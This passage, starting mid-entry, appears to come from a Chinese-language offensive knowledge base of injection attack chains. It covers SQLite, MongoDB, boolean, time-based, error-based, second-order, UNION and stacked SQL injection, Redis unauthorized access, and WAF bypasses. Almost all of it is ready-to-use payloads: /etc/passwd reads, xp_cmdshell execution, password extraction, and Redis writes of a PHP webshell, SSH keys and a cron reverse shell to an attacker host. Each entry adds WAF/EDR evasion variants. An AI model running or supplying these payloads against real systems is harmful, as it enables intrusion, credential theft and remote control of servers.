' UNION SELECT load_extension('libsqlite3.so'),NULL--
' UNION SELECT readfile('/etc/passwd'),NULL--
```

**WAF/EDR 绕过变体：**

**1. SQLite字符编码绕过**
_使用CHAR()函数构造字符串、X前缀十六进制字面量、typeof()和unicode()进行类型推断盲注绕过WAF_
```
' UNION SELECT CHAR(116,101,115,116),NULL--
' UNION SELECT X'746573746461746131',NULL--
' AND typeof(CASE WHEN unicode(substr((SELECT name FROM sqlite_master LIMIT 1),1,1))>96 THEN 1 ELSE 0.0 END)='integer'--
```

**2. SQLite运算符与函数替代**
_使用LIKE/GLOB模式匹配替代等号、instr()替代SUBSTRING、group_concat配合replace混淆数据_
```
' AND (SELECT name FROM sqlite_master WHERE type='table' AND name LIKE '%user%')--
' AND (SELECT name FROM sqlite_master WHERE type='table' AND name GLOB '*user*')--
' UNION SELECT replace(group_concat(name,','),'_',''),NULL FROM sqlite_master WHERE type='table'--
' AND instr((SELECT sql FROM sqlite_master LIMIT 1),'password')>0--
```

---

### MongoDB注入  `sqli-mongodb-basic`
NoSQL数据库注入攻击技术
子类：**MongoDB** · tags: `nosql` `mongodb` `injection`

**前置条件：** 目标使用MongoDB；存在用户输入拼接查询

**攻击链：**

**1. 1. 探测注入点**
_探测MongoDB注入_
```
{"username": "admin", "password": "password"}
{"username": "admin", "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
```

**2. 2. 绕过认证**
_绕过登录认证_
```
{"username": "admin", "password": {"$ne": "wrongpass"}}
{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

**3. 3. 逻辑运算注入**
_使用$or逻辑运算_
```
{"username": "admin", "password": {"$or": [{"password": "realpass"}, {"1": "1"}]}}
```

**4. 4. 正则注入**
_正则表达式注入_
```
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
```

**5. 5. $where注入**
_$where子句JavaScript注入_
```
{"$where": "this.username == 'admin' && this.password.match(/.*/)"}
```

**6. 6. 盲注提取数据**
_使用正则逐字符提取_
```
{"username": {"$regex": "^a"}}
{"username": {"$regex": "^ad"}}
{"username": {"$regex": "^adm"}}
逐字符枚举用户名
```

**WAF/EDR 绕过变体：**

**1. Unicode绕过**
_Unicode编码绕过_
```
{"username": {"\u0024ne": ""}}
使用Unicode编码$符号
```

---

### Redis未授权访问  `sqli-redis`
Redis未授权访问和命令注入
子类：**Redis** · tags: `redis` `nosql` `injection`

**前置条件：** Redis服务可访问；未授权或弱密码

**攻击链：**

**1. 1. 探测Redis**
_探测Redis服务_
```
redis-cli -h target.com ping
redis-cli -h target.com info
```

**2. 2. 未授权访问**
_未授权访问Redis_
```
redis-cli -h target.com
> INFO
> KEYS *
> GET sensitive_key
```

**3. 3. 写入Webshell**  _[linux]_
_写入Webshell_
```
redis-cli -h target.com
> CONFIG SET dir /var/www/html/
> CONFIG SET dbfilename shell.php
> SET shell "<?php system($_GET['cmd']); ?>"
> SAVE
```

**4. 4. 写入SSH公钥**  _[linux]_
_写入SSH公钥_
```
redis-cli -h target.com
> CONFIG SET dir /root/.ssh/
> CONFIG SET dbfilename authorized_keys
> SET sshkey "ssh-rsa AAAA..."
> SAVE
```

**5. 5. 写入Cron任务**  _[linux]_
_写入Cron任务_
```
redis-cli -h target.com
> CONFIG SET dir /var/spool/cron/
> CONFIG SET dbfilename root
> SET cron "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/attacker/4444 0>&1\n\n"
> SAVE
```

**6. 6. 主从复制RCE**  _[linux]_
_主从复制RCE_
```
使用redis-rogue-server工具:
python redis-rogue-server.py --rhost target.com --lhost attacker.com
通过主从复制加载恶意模块执行命令
```

**WAF/EDR 绕过变体：**

**1. Redis命令混淆绕过**
_使用引号分割命令字符串、拼接变量等方式混淆Redis命令绕过WAF检测_
```
redis-cli -h target.com
> "C""O""N""F""I""G" SET dir /var/www/html/
> $(printf 'CONF')$(printf 'IG') SET dbfilename shell.php
> SET shell "<?php system(\$_GET['cmd']); ?>"
> SAVE
```

**2. Redis Lua脚本执行绕过**
_通过EVAL执行Lua脚本间接调用Redis命令，绕过对CONFIG/SET等直接命令的检测_
```
redis-cli -h target.com
> EVAL "redis.call('set','shell','<?php system(\$_GET[c]); ?>')" 0
> EVAL "redis.call('config','set','dir','/var/www/html/')" 0
> EVAL "redis.call('config','set','dbfilename','test.php')" 0
> EVAL "redis.call('save')" 0
```

---

### 布尔盲注  `sqli-blind`
基于布尔条件的SQL盲注技术
子类：**盲注** · tags: `sqli` `blind` `boolean`

**前置条件：** 存在SQL注入；页面有真/假两种不同响应

**攻击链：**

**1. 1. 确认盲注**
_确认布尔盲注_
```
' AND 1=1-- (返回正常)
' AND 1=2-- (返回异常)
确认存在布尔盲注
```

**2. 2. 获取数据库名长度**
_枚举数据库名长度_
```
' AND LENGTH(database())=1--
' AND LENGTH(database())=2--
...
' AND LENGTH(database())=N--
直到返回正常
```

**3. 3. 逐字符枚举数据库名**
_逐字符提取数据库名_
```
' AND ASCII(SUBSTRING(database(),1,1))>97--
' AND ASCII(SUBSTRING(database(),1,1))>100--
...
使用二分法快速定位字符
```

**4. 4. 使用工具自动化**
_使用sqlmap自动化_
```
sqlmap -u "http://target.com?id=1" --technique=B --dbs
使用sqlmap进行布尔盲注
```

**WAF/EDR 绕过变体：**

**1. 布尔盲注条件表达式替代**
_使用CASE WHEN替代IF()、MID()替代SUBSTRING()、LEFT/RIGHT组合截取、BETWEEN替代大于小于比较_
```
' AND (CASE WHEN (MID(database(),1,1)='a') THEN 1 ELSE 0 END)=1--
' AND LEFT(database(),1)>'a'--
' AND RIGHT(LEFT(database(),2),1)='d'--
' AND ORD(MID(database(),1,1))BETWEEN 97 AND 122--
```

**2. 布尔盲注数学运算与位运算绕过**
_使用HEX/CONV进行编码比较、位与运算(&)判断字符范围、POW()数学函数混淆、DIV替代AND_
```
' AND (SELECT CONV(HEX(SUBSTR(database(),1,1)),16,10))>96--
' AND (SELECT ORD(MID(database(),1,1))&0x40)=0x40--
' AND (SELECT POW(ORD(MID(database(),1,1)),0))+0=1--
' DIV 1 AND (SELECT LENGTH(database()))>0--
```

---

### 时间盲注  `sqli-time-based`
基于时间延迟的SQL盲注技术
子类：**盲注** · tags: `sqli` `blind` `time`

**前置条件：** 存在SQL注入；页面响应时间可控

**攻击链：**

**1. 1. 确认时间盲注**
_确认时间盲注_
```
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
观察响应是否延迟5秒
```

**2. 2. 获取数据库名长度**
_枚举数据库名长度_
```
' AND IF(LENGTH(database())=N,SLEEP(5),0)--
枚举数据库名长度
```

**3. 3. 逐字符提取**
_逐字符提取数据_
```
' AND IF(ASCII(SUBSTRING(database(),1,1))>97,SLEEP(5),0)--
使用二分法提取字符
```

**4. 4. 不同数据库延时函数**
_各数据库延时函数_
```
MySQL: SLEEP(5), BENCHMARK()
MSSQL: WAITFOR DELAY '0:0:5'
PostgreSQL: pg_sleep(5)
Oracle: DBMS_LOCK.SLEEP(5)
```

**WAF/EDR 绕过变体：**

**1. 时间延迟替代函数绕过**
_使用BENCHMARK()替代SLEEP()、笛卡尔积重查询消耗时间、GET_LOCK()锁等待、CASE条件触发延时_
```
' AND BENCHMARK(5000000,SHA1('test'))--
' AND (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)--
' AND GET_LOCK('sqli_test',5)--
' AND (CASE WHEN database() LIKE '%' THEN BENCHMARK(3000000,MD5('x')) ELSE 0 END)--
```

**2. 跨数据库时间延迟绕过**
_利用各数据库特有的时间延迟方法：PostgreSQL的pg_sleep条件触发、MSSQL的IF条件WAITFOR、Oracle的DBMS_PIPE.RECEIVE_MESSAGE替代DBMS_LOCK_
```
PostgreSQL: ' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
MSSQL: '; IF (1=1) WAITFOR DELAY '0:0:5'--
Oracle: ' AND 1=CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 0 END--
MySQL: ' AND (SELECT SLEEP(5) FROM DUAL WHERE 1=1)--
```

---

### 报错注入  `sqli-error-based`
利用错误信息提取数据的SQL注入
子类：**报错注入** · tags: `sqli` `error` `extractvalue`

**前置条件：** 存在SQL注入；错误信息会显示在页面上

**攻击链：**

**1. 1. 确认报错注入**
_测试报错注入_
```
' AND extractvalue(1,concat(0x7e,version()))--
' AND updatexml(1,concat(0x7e,version()),1)--
```

**2. 2. 获取数据库信息**
_获取基础信息_
```
' AND extractvalue(1,concat(0x7e,database()))--
' AND extractvalue(1,concat(0x7e,user()))--
' AND extractvalue(1,concat(0x7e,version()))--
```

**3. 3. 获取表名**
_获取表名_
```
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))--
```

**4. 4. 获取数据**
_提取数据_
```
' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 0,1)))--
```

**5. 5. 其他报错函数**
_其他报错注入方法_
```
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND EXP(~(SELECT * FROM (SELECT version())a))--
```

**WAF/EDR 绕过变体：**

**1. 替代报错函数绕过**
_使用GEOMETRYCOLLECTION空间函数、JSON_KEYS、ST_LatFromGeoHash等冷门函数替代extractvalue/updatexml触发报错_
```
' AND GEOMETRYCOLLECTION((SELECT * FROM (SELECT * FROM (SELECT version())a)b))--
' AND (SELECT 1 FROM (SELECT NTILE(1) OVER(ORDER BY (SELECT version())))a)--
' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))--
' AND ST_LatFromGeoHash(version())--
```

**2. 编码与科学计数法绕过**
_使用unhex(hex())双层编码、EXP()科学计数法溢出、URL双重编码（%26%26替代AND）绕过WAF检测_
```
' AND extractvalue(1,concat(0x7e,(SELECT unhex(hex(database())))))--
' AND 1=1 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7e,database(),0x7e) x)a))--
' AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.schemata GROUP BY x)a)--
' %26%26 updatexml(1,concat(0x7e,(select%20database())),1)--%20
```

---

### 二阶SQL注入  `sqli-second-order`
存储后触发的SQL注入攻击
子类：**二阶注入** · tags: `sqli` `second-order` `stored`

**前置条件：** 存在数据存储功能；存储数据被二次使用

**攻击链：**

**1. 1. 探测二阶注入**
_探测二阶注入点_
```
注册用户名: admin'--
或: admin' OR '1'='1
登录后查看是否影响其他功能
```

**2. 2. 用户名注入**
_用户名触发注入_
```
注册用户: admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
登录触发报错注入
```

**3. 3. 密码重置注入**
_密码重置功能注入_
```
输入邮箱: ' OR '1'='1
可能触发密码重置所有用户
```

**4. 4. 订单/评论注入**
_评论触发注入_
```
提交评论: ' UNION SELECT username,password FROM users--
管理员查看评论时触发
```

**WAF/EDR 绕过变体：**

**1. 编码存储触发绕过**
_在存储阶段使用注释截断(/**/)或CHAR()编码构造payload，WAF在输入时检测不到恶意SQL，但数据库二次使用时自动触发_
```
注册用户名: admin'/*
随后修改密码时SQL变为: UPDATE users SET password='new' WHERE username='admin'/*'

注册用户名: CONCAT(CHAR(39),CHAR(32),CHAR(79),CHAR(82),CHAR(32),CHAR(39),CHAR(49),CHAR(39),CHAR(61),CHAR(39),CHAR(49))
存储后二次使用时自动解码触发注入
```

**2. Unicode标准化绕过**
_利用Unicode全角字符(U+FF07)标准化、转义序列还原、不同功能模块的过滤差异来绕过WAF检测_
```
注册用户名: admin＇ OR ＇1＇=＇1
(使用全角引号U+FF07，数据库标准化为半角后触发)

注册邮箱: test@test.com' UNION SELECT password FROM users WHERE '1'='1
(邮箱验证通过WAF但存储后在其他查询中拼接触发)

评论内容: \x27 OR 1=1--
(转义序列在存储层被还原为单引号)
```

---

### 联合查询注入  `sqli-union`
使用UNION SELECT提取数据
子类：**联合查询** · tags: `sqli` `union` `select`

**前置条件：** 存在注入点；可显示查询结果

**攻击链：**

**1. 1. 确定列数**
_确定列数_
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
直到报错
或:
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

**2. 2. 确定显示列**
_确定显示位置_
```
' UNION SELECT 1,2,3--
' UNION SELECT 'a','b','c'--
找出哪些列会显示在页面上
```

**3. 3. 提取数据**
_提取数据_
```
' UNION SELECT username,password,3 FROM users--
' UNION SELECT table_name,2,3 FROM information_schema.tables--
```

**4. 4. 绕过过滤**
_绕过关键字过滤_
```
' /*!UNION*/ /*!SELECT*/ 1,2,3--
' UnIoN SeLeCt 1,2,3--
' UNION/**/SELECT/**/1,2,3--
```

**WAF/EDR 绕过变体：**

**1. UNION注入关键字绕过**
_使用MySQL版本注释/*!50000*/、URL编码UNION/SELECT关键字、%23换行绕过、空白字符混淆（%09 TAB, %0d CR, %0b VT）_
```
' /*!50000UNION*/ /*!50000SELECT*/ 1,database(),3--
' %55%4e%49%4f%4e %53%45%4c%45%43%54 1,2,3--
' uNiOn%23%0aSeLeCt 1,2,3--
' UNION%0a%09%0d%0bSELECT%0a1,2,3--
```

**2. UNION注入NULL字节与分块绕过**
_使用NULL字节(%00)截断WAF检测、UNION ALL绕过去重检测、HTTP分块传输编码将关键字分散到不同chunk、自定义SEPARATOR替代默认逗号_
```
' UNION%00SELECT 1,2,3--
' /*!UNION*/%20/*!ALL*//*!SELECT*/ 1,2,3--
Transfer-Encoding: chunked

5
UNION
7
 SELECT
1
 
0

' UNION SELECT 1,group_concat(table_name SEPARATOR 0x3c62723e),3 FROM information_schema.tables WHERE table_schema=database()--
```

---

### 堆叠查询注入  `sqli-stacked`
执行多条SQL语句的注入
子类：**堆叠查询** · tags: `sqli` `stacked` `queries`

**前置条件：** 支持多语句执行；MySQL/PostgreSQL/MSSQL

**攻击链：**

**1. 1. 探测堆叠查询**
_探测是否支持堆叠查询_
```
'; SELECT SLEEP(5)--
'; SELECT 1--
'; WAITFOR DELAY '0:0:5'--
```

**2. 2. MySQL堆叠查询**  _[linux]_
_MySQL执行多语句_
```
'; INSERT INTO users(username,password) VALUES('hacker','hacked');--
'; UPDATE users SET password='hacked' WHERE username='admin';--
'; SELECT SLEEP(5);--
> ⚠️ 仅验证堆叠注入存在性，严禁 DROP/TRUNCATE/DELETE
```

**3. 3. MSSQL堆叠查询**  _[windows]_
_MSSQL执行命令_
```
'; EXEC xp_cmdshell('whoami');--
'; EXEC sp_executesql N'SELECT * FROM users';--
```

**4. 4. PostgreSQL堆叠查询**  _[linux]_
_PostgreSQL读取文件_
```
'; COPY users FROM '/etc/passwd';--
'; SELECT * FROM pg_read_file('/etc/passwd');--
```

**WAF/EDR 绕过变体：**

**1. 堆叠查询终止符替代绕过**
_使用URL编码分号(%3B)、换行符分隔、内联注释包裹SELECT、PREPARE预处理执行十六进制编码的查询语句_
```
' %3B SELECT user()--
' ;%0a SELECT user()--
' ; /*!SELECT*/ user()--
'; SET @q=0x53454C45435420757365722829; PREPARE stmt FROM @q; EXECUTE stmt;--
```

**2. 堆叠查询条件执行绕过**
_使用字符串拼接分割命令关键字、CHAR()编码命令参数、CASE条件执行、PostgreSQL DO块执行复杂逻辑_
```
'; IF(1=1) EXEC('wh'+'oam'+'i');--
'; DECLARE @s VARCHAR(100)=CHAR(119)+CHAR(104)+CHAR(111)+CHAR(97)+CHAR(109)+CHAR(105); EXEC xp_cmdshell @s;--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) END;--
'; DO $$ BEGIN PERFORM dblink_connect('host=attacker.com dbname=test'); END $$;--
```

---

### SQL注入WAF绕过  `sqli-waf-bypass`
绕过Web应用防火墙的技术
子类：**WAF绕过** · tags: `sqli` `waf` `bypass`

**前置条件：** 目标存在SQL注入点；存在WAF防护

**攻击链：**

**1. 分块传输编码**
_利用分块传输绕过WAF检测_
```
Transfer-Encoding: chunked

2
id
1
=
1
1

0
```

**2. HTTP参数污染(HPP)**
_利用HPP拆分恶意Payload_
```
?id=1&id=UNION&id=SELECT&id=1,2,3--
```

**3. 等价函数替换**
_使用GREATEST替代>符号_
```
' AND GREATEST(1,0)--
```

**4. 无逗号注入**
_不使用逗号进行联合查询_
```
' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--
```

**5. IBM/Oracle特有**
_利用特定数据库特性绕过通用规则_
```
' UNION SELECT CAST(1 AS VARCHAR(10)) FROM dual--
```

**6. 垃圾数据填充**
_超长数据溢出WAF缓冲区 (示意代码)_
```
/* !50000AAAAAAAAAA...(1000+字节垃圾数据)...*/ UNION SELECT 1,2,3--
```

**7. Content-Type欺骗**
_利用multipart绕过检测_
```
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="id"

1 UNION SELECT 1,2,3--
------WebKitFormBoundary--
```

**8. JSON注入**
_在JSON数据中注入_
```
{"id": "1' UNION SELECT 1,2,3--"}
```

---
